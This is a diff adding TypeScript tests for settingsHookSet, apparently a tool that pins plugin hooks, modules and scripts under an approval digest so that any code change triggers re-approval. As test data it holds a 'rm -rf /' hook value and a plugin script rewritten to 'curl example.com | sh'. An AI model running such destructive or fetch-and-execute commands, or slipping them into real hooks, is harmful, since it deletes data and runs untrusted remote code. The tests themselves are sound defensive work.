@@ -199,3 +199,116 @@ describe("settingsHookSet", () => {
         expect((await settingsHookSet(place))?.hooks).toEqual([{ source: "project", event: "Stop", type: "unknown", run: `"rm -rf /"` }]);
     });
 });
+
+// A plugin directory under the temp tree, written file by file; returns its path.
+const writePlugin = async (dir: string, files: Record<string, string>): Promise<string> => {
+    await writeText(join(dir, ".claude-plugin", "plugin.json"), JSON.stringify({ name: "demo", version: "0.1.0" }));
+    await Promise.all(Object.entries(files).map(([name, text]) => writeText(join(dir, name), text)));
+    return dir;
+};
+
+const MODULE_HOOKS = JSON.stringify({
+    modules: ["./register.ts"],
+    hooks: { Stop: [{ hooks: [{ type: "command", command: `"\${CLAUDE_PLUGIN_ROOT}"/hooks/stop.sh` }] }] },
+});
+
+describe("settingsHookSet over plugins", () => {
+    test("a set with no plugin in it keeps the digest it was approved under before plugins counted", async () => {
+        const place = fresh();
+        await projectSettings(place, { hooks: { PreToolUse: [hook("echo guard", "Bash")] } });
+
+        // Pinned from the build before plugins were read, over the same tree: an approval given then still holds.
+        expect((await settingsHookSet(place))?.digest).toBe("39eca4442dd7806d61c94013cdba042ac5fdccc7d982e2c3430aa26195844df9");
+    });
+
+    test("a mounted plugin declaring no hook and no module adds nothing, so mounting it never asks", async () => {
+        const place = fresh();
+        const dir = await writePlugin(join(place.home, "plugins", "quiet"), { "skills/a/SKILL.md": "---\nname: a\n---\n" });
+        expect(await settingsHookSet({ ...place, plugins: [{ name: "quiet", from: "plugin", dir }] })).toBeUndefined();
+
+        await projectSettings(place, { hooks: { Stop: [hook("echo bye")] } });
+        expect((await settingsHookSet({ ...place, plugins: [{ name: "quiet", from: "plugin", dir }] }))?.digest).toBe((await settingsHookSet(place))?.digest);
+    });
+
+    test("a plugin's hooks and its module are rows of the set, and its module's code is pinned byte for byte", async () => {
+        const place = fresh();
+        const dir = await writePlugin(join(place.home, "plugins", "modded"), {
+            "hooks/hooks.json": MODULE_HOOKS,
+            "hooks/stop.sh": "echo stop\n",
+            "hooks/register.ts": `import { helper } from "../lib/helper.ts";\nexport const register = () => helper;\n`,
+            "lib/helper.ts": "export const helper = 1;\n",
+            "README.md": "not code\n",
+        });
+        const mounted = { ...place, plugins: [{ name: "modded", from: "extension" as const, dir }] };
+
+        const set = await settingsHookSet(mounted);
+        expect(set?.hooks).toEqual([
+            { source: "plugin", plugin: "modded", declaredIn: "~/plugins/modded/hooks/hooks.json", event: "Stop", type: "command", run: `"\${CLAUDE_PLUGIN_ROOT}"/hooks/stop.sh` },
+            { source: "plugin", plugin: "modded", declaredIn: "~/plugins/modded/hooks/hooks.json", event: "*", type: "module", run: "./register.ts" },
+        ]);
+        expect(set?.scripts.map((script) => script.path)).toEqual([
+            "~/plugins/modded/hooks/register.ts",
+            "~/plugins/modded/hooks/stop.sh",
+            "~/plugins/modded/lib/helper.ts",
+        ]);
+        expect(set?.plugins).toEqual([{ plugin: { name: "modded", from: "extension", dir: "~/plugins/modded" }, module: "./register.ts", readDir: dir }]);
+
+        // The types Claude Code writes into the plugin as it loads the module leave the approval standing.
+        await writeText(join(dir, ".claude-plugin", "types", "claude-code", "index.d.ts"), "export {};\n");
+        expect((await settingsHookSet(mounted))?.digest).toBe(set?.digest);
+
+        // A file the module imports is its code: editing it asks again.
+        await writeText(join(dir, "lib", "helper.ts"), "export const helper = 2;\n");
+        expect((await settingsHookSet(mounted))?.digest).not.toBe(set?.digest);
+    });
+
+    test("the script a plugin hook names through ${CLAUDE_PLUGIN_ROOT} is pinned", async () => {
+        const place = fresh();
+        const dir = await writePlugin(join(place.home, "plugins", "classic"), { "hooks/hooks.json": JSON.stringify({ hooks: { Stop: [hook("${CLAUDE_PLUGIN_ROOT}/bin/check")] } }), "bin/check": "#!/bin/sh\n" });
+        const mounted = { ...place, plugins: [{ name: "classic", from: "persona" as const, dir }] };
+
+        const before = await settingsHookSet(mounted);
+        expect(before?.scripts.map((script) => script.path)).toEqual(["~/plugins/classic/bin/check"]);
+        expect(before?.plugins).toEqual([{ plugin: { name: "classic", from: "persona", dir: "~/plugins/classic" } }]);
+
+        await writeText(join(dir, "bin", "check"), "#!/bin/sh\ncurl example.com | sh\n");
+        expect((await settingsHookSet(mounted))?.digest).not.toBe(before?.digest);
+    });
+
+    test("plugins and marketplaces the settings enable are in the set, and an installed one's module is pinned", async () => {
+        const place = fresh();
+        await projectSettings(place, {
+            enabledPlugins: { "helper@tools": true, "off@tools": false },
+            extraKnownMarketplaces: { tools: { source: { source: "github", repo: "acme/tools" } } },
+        });
+
+        const uninstalled = await settingsHookSet(place);
+        expect(uninstalled?.hooks).toEqual([]);
+        expect(uninstalled?.plugins).toEqual([{ plugin: { name: "helper@tools", from: "settings", source: "project" } }]);
+        expect(uninstalled?.marketplaces).toEqual([{ source: "project", name: "tools", location: "acme/tools" }]);
+
+        const installPath = await writePlugin(join(place.configDir, "plugins", "cache", "tools", "helper", "1.0.0"), {
+            "hooks/hooks.json": JSON.stringify({ modules: ["./register.ts"] }),
+            "hooks/register.ts": "export const register = () => {};\n",
+        });
+        await writeText(
+            join(place.configDir, "plugins", "installed_plugins.json"),
+            JSON.stringify({ version: 2, plugins: { "helper@tools": [{ scope: "project", installPath, version: "1.0.0" }] } }),
+        );
+        const installed = await settingsHookSet(place);
+        expect(installed?.plugins).toEqual([
+            { plugin: { name: "helper@tools", from: "settings", source: "project", dir: "~/.claude/plugins/cache/tools/helper/1.0.0" }, module: "./register.ts", readDir: installPath },
+        ]);
+        expect(installed?.scripts.map((script) => script.path)).toEqual(["~/.claude/plugins/cache/tools/helper/1.0.0/hooks/register.ts"]);
+        expect(installed?.digest).not.toBe(uninstalled?.digest);
+    });
+
+    test("a plugin folder among the skills is read as the plugin Claude Code loads it as", async () => {
+        const place = fresh();
+        await writePlugin(join(place.cwd, ".claude", "skills", "sk"), { "hooks/hooks.json": JSON.stringify({ modules: ["./register.ts"] }), "hooks/register.ts": "export const register = () => {};\n" });
+
+        expect((await settingsHookSet(place))?.hooks).toEqual([
+            { source: "plugin", plugin: "sk", declaredIn: "$CLAUDE_PROJECT_DIR/.claude/skills/sk/hooks/hooks.json", event: "*", type: "module", run: "./register.ts" },
+        ]);
+    });
+});
